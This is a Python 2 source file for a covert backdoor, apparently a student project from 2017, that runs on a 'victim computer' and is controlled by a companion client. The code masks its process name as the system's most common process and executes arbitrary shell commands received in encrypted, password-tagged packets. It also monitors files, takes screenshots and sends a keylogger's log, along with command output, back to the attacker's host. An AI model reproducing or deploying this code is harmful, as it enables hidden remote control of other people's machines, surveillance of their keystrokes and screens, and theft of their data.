#  =================================================================
#  	SOURCE FILE: backdoor.py
#  
#
#	DATE: Dec 4th 2017
#  
#  
#  	AUTHOR: Paul Cabanez, Justin Chau
#
#	
#	DESCRIPTION: This is a backdoor program ran on the victim computer.
#		It works with client.py where it is place on a seperate computer.
#		Receives commands from client.py and executes it on the workstation
#		and replies back to the client with information
#	
#
#	LAST REVISED: Nov 22nd 2017
#  =================================================================

import argparse, setproctitle, time, base64, logging, encryption, configReader, helpers, threading, keylogger
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * #sudo apt-get install scapy
from subprocess import *
from Crypto.Cipher import AES
from ctypes import cdll, byref, create_string_buffer
from watchdog.observers import Observer
from fileMonitor import FileMonitor
from PIL import Image
from multiprocessing import Process

state = 0
observer = Observer()
monitor = ''
clientIP = ""
fileProcess = ''

#  =================================================================
#  name: verify_root
#  @param:
#		none
#  @return
#  		none
#
#  description: verify if the program is ran in root if not exit the program
#  =================================================================
def verify_root():
	if(os.getuid() != 0):
			exit("This program is not in root/sudo")

		
#  ================================================================= 
#  name: mask
#  @param
#		none
#
#  @return
#		none
#
#  description: grabs the most used process and masks itself as that process
#  =================================================================
def mask():
	command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
	commandResult = command.read()
	setproctitle.setproctitle(commandResult)
	print "Most common process: {0}".format(commandResult)	



#  =================================================================
#  name: startMonitor
#  @param:
#		path - the path of the file that needs to be monitored
#		ip 	- the ip of the attackers IP to send back information or file
#
#  @return
#		none
#  
#  description: monitor file/folder to see if there were any creation,
#		modification or deletion then sends back information to the client program
#  =================================================================	
def startMonitor(path, ip):
	global monitor
	
	#store observer schedule 
	monitor = observer.schedule(FileMonitor(ip),path)
	observer.start() #start observer
	
	message = "File/Folder Monitored: " + path
	
	time.sleep(1)
	
	#notify the client that a file is being monitored
	helpers.sendMessage(message, configReader.srcIP, 9000)
	
	while True:
		try:
			time.sleep(1)
		except KeyboardInterrupt:
			observer.stop()
			break

#  =================================================================
#  name: stopMonitor
#  @param:
#		none
#
#  @return
#		none
#  
#  description: stop the monitor of all file/folder
#
#  =================================================================	
def stopMonitor():
	global monitor
	observer.unschedule_all()
	
#  =================================================================
#  name: shellCommand
#  @param:
#		packet 	- a packet received from client program
#		command - the command that needs to be executed e.g. ls mkdir etc
#
#  @return
#		none
#  
#  description: Executes the shell command given and will send back 
#		a reponse packet with information of command
#  =================================================================
def shellCommand(packet,command):
	ip = packet[IP].src
				
	process = subprocess.Popen(command, shell=True, stdout= subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout, stderr = process.communicate()
	#Concatenate the shell output to a variable prepped to send back to client.
	data = stdout + stderr
	
	print "Command Executed: " + command

	encryptedData = encryption.encryption(data)
	encryptedData = helpers.chunkString(2, encryptedData)
				
	lastIndex = len(encryptedData) - 1
				
	time.sleep(1)
	
	#splits the data into chunks and sents it to the client
	for index, chunk in enumerate(encryptedData):
		if len(chunk) == 2:
			pairs = list(chunk)
			packet = helpers.createPacketTwo(configReader.protocol, ip, pairs[0], pairs[1], 9000)

		elif len(chunk) == 1:
			packet = helpers.createPacketOne(configReader.protocol, ip, chunk, 9000)

		
		if index == lastIndex:
			packet = packet/Raw(load=configReader.password)
		
		send(packet, verbose=0)
		time.sleep(0.1)
	
#  =================================================================
#  name: runCmd
#  @param:
#		packet 	- a packet received from the attacker program with correct port 
#				in this case port 9000 for messages
#
#  @return
#		none
#  
#  description: Decrypts incoming packet and checks what command it has to run.
#		There are three commands: shell, monitor and stop
#		Shell - execute shell commands
#		Monitor - monitors file
#		Stop - stops the monitor
#  =================================================================
def runCmd(packet):
	global fileProcess

	#check for IP and raw layer in IP
	if packet.haslayer(IP) and packet.haslayer(Raw):
		if packet[IP].src != clientIP:
			return
		
		print "Received Packet"
		#decrypt the packet
		command = encryption.decryption(packet[Raw].load) 
		
		#check for contents in command variable
		if not command:
			return
		
		#check for the password 
        if command.startswith(configReader.password):
			
			#grab content after the password
			command = command[len(configReader.password):]
			
			#split the command
			try:
				commandType, commandString = command.split(' ',1)
			#if the command has only one command
			except ValueError:
				commandType = command
			
			#if the command is shell
			if commandType == 'shell':
				shellCommand(packet, commandString)
				
			#if the command is monitor
			elif commandType == 'monitor':
			
				try:
					#start the monitor process
					fileProcess = Process(target=startMonitor, args=(commandString, packet[IP].src))
					fileProcess.daemon = True
					fileProcess.start()

					print "Sending Response: File Monitoring Started\n"
					
				#catch the error if something is already monitored
				except RuntimeError:
					helpers.sendMessage("You already have a monitor in progress", configReader.srcIP, 9000)
				except OSError:
					helpers.sendMessage("Path of file/folder not found", configReader.srcIP, 9000)
				
			#command is stop
			elif commandType == 'stop':
				try:
					stopMonitor()
					fileProcess.terminate()
					print "Monitoring has stopped"
				except AttributeError:
						helpers.sendMessage("There is no monitor to stop", configReader.srcIP,9000)
						print "Received command 'stop' but there is no file monitor running"
						print "Notifying client...."
						

			#command is screenshot
			elif commandType == 'screenshot':
				screenshot(packet)
				
			#command grab keystroke log
			elif commandType == 'keylog':
					helpers.fileSender(configReader.srcIP, 'key.log', 6000)
			
			else:
				print "Unknown Command\n"
				helpers.sendMessage("Unknown Command", configReader.srcIP, 9000)
				
def screenshot(packet):
	
	os.system("gnome-screenshot --file=./desktop.png")
	helpers.fileSender(configReader.srcIP, "./desktop.png", 6000)
	os.system("rm -rf ./desktop.png")
            
      			
#  =================================================================
#  name: knock
#  @param:
#		packet - the packet received by the backdoor
#
#  @return
#		none
#  
#  description: checks for knocking sequence of packet by keeping track
# 		of how many packets were in the correct sequence
#  =================================================================	
def knock(packet):
	global state
	global clientIP
	
	if IP in packet:
		if UDP in packet:
			ip = packet[IP].src
			
			if packet[UDP].sport == int(configReader.portknockArray[0]) and state == 0:
				state = 1
				print packet[IP].src + " First Sequence Knock"
			elif packet[UDP].sport == int(configReader.portknockArray[1]) and state == 1:
				state = 2
				print packet[IP].src + " Second Sequence Knock"
			elif packet[UDP].sport == int(configReader.portknockArray[2]) and state == 2:
				state = 3
				clientIP = packet[IP].src
				print packet[IP].src + " Third Sequence Knock"
				print "Connection Accepted\n"
			else:
				print "Wrong Port Knock Sequence"
	
	

#  =================================================================
#  name: main
#  @param
#		none
#  @return
#		none
#  
#  description: main runner of the program
#  =================================================================
def main():
    verify_root()
    mask()
    
    print("Looking for traffic..")
    #remove comment when done debugging
    #while state is not 3:  
        #sniff(filter="udp and dst port 7000", prn=knock, count=1)
        
    global clientIP
    clientIP = configReader.srcIP
    
    while True:
		sniff(filter="dst port 8000", prn=runCmd, count=1)
		
		
if __name__ == '__main__':
	try:
		while True:
			main()
	except KeyboardInterrupt:
			exit("Exiting....")
